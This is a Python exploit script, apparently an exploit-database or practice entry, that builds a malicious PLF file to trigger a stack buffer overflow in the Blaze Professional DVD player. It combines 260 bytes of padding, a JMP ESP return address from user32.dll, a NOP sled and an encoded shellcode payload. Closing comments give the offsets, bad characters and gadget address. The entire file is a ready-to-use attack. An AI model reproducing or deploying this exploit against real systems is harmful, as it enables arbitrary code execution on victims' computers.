#! /usr/bin/python3

# Blaze Professional DVD - PLF file buffer overflow



dummy_data = bytearray(("A" * 260).encode("ascii"))

return_address = bytearray(b"\x53\x93\x42\x7e")

nop_num_bytes = 100  # should be greater than 20

nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\xbe\xb5\xa8\xc7\x9e\xdb\xc5\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
    b"\x53\x31\x70\x12\x83\xc0\x04\x03\xc5\xa6\x25\x6b\xd9\x5f\x2b"
    b"\x94\x21\xa0\x4c\x1c\xc4\x91\x4c\x7a\x8d\x82\x7c\x08\xc3\x2e"
    b"\xf6\x5c\xf7\xa5\x7a\x49\xf8\x0e\x30\xaf\x37\x8e\x69\x93\x56"
    b"\x0c\x70\xc0\xb8\x2d\xbb\x15\xb9\x6a\xa6\xd4\xeb\x23\xac\x4b"
    b"\x1b\x47\xf8\x57\x90\x1b\xec\xdf\x45\xeb\x0f\xf1\xd8\x67\x56"
    b"\xd1\xdb\xa4\xe2\x58\xc3\xa9\xcf\x13\x78\x19\xbb\xa5\xa8\x53"
    b"\x44\x09\x95\x5b\xb7\x53\xd2\x5c\x28\x26\x2a\x9f\xd5\x31\xe9"
    b"\xdd\x01\xb7\xe9\x46\xc1\x6f\xd5\x77\x06\xe9\x9e\x74\xe3\x7d"
    b"\xf8\x98\xf2\x52\x73\xa4\x7f\x55\x53\x2c\x3b\x72\x77\x74\x9f"
    b"\x1b\x2e\xd0\x4e\x23\x30\xbb\x2f\x81\x3b\x56\x3b\xb8\x66\x3f"
    b"\x88\xf1\x98\xbf\x86\x82\xeb\x8d\x09\x39\x63\xbe\xc2\xe7\x74"
    b"\xc1\xf8\x50\xea\x3c\x03\xa1\x23\xfb\x57\xf1\x5b\x2a\xd8\x9a"
    b"\x9b\xd3\x0d\x36\x93\x72\xfe\x25\x5e\xc4\xae\xe9\xf0\xad\xa4"
    b"\xe5\x2f\xcd\xc6\x2f\x58\x66\x3b\xd0\x77\x2b\xb2\x36\x1d\xc3"
    b"\x92\xe1\x89\x21\xc1\x39\x2e\x59\x23\x12\xd8\x12\x25\xa5\xe7"
    b"\xa2\x63\x81\x7f\x29\x60\x15\x9e\x2e\xad\x3d\xf7\xb9\x3b\xac"
    b"\xba\x58\x3b\xe5\x2c\xf8\xae\x62\xac\x77\xd3\x3c\xfb\xd0\x25"
    b"\x35\x69\xcd\x1c\xef\x8f\x0c\xf8\xc8\x0b\xcb\x39\xd6\x92\x9e"
    b"\x06\xfc\x84\x66\x86\xb8\xf0\x36\xd1\x16\xae\xf0\x8b\xd8\x18"
    b"\xab\x60\xb3\xcc\x2a\x4b\x04\x8a\x32\x86\xf2\x72\x82\x7f\x43"
    b"\x8d\x2b\xe8\x43\xf6\x51\x88\xac\x2d\xd2\xb8\xe6\x6f\x73\x51"
    b"\xaf\xfa\xc1\x3c\x50\xd1\x06\x39\xd3\xd3\xf6\xbe\xcb\x96\xf3"
    b"\xfb\x4b\x4b\x8e\x94\x39\x6b\x3d\x94\x6b"
)

buffer = dummy_data + return_address + nop_sled + shell_code



with open("exploit.plf", "wb") as exploit_file:
    exploit_file.write(buffer)
    print("[+] exploit.plf file written successfully.")


# Pattern length used: 3000
# EIP value after crash: 0x37694136
# Value at location where ESP points: 0x6A41336A
# EIP pattern offset: 260
# ESP pattern offset: 280
# Bytes between the end return address and where ESP points: 20
# Bad characters: 0x00, 0x0a, 0x1a
# Address of JMP ESP instruction in user32.dll: 0x7E429353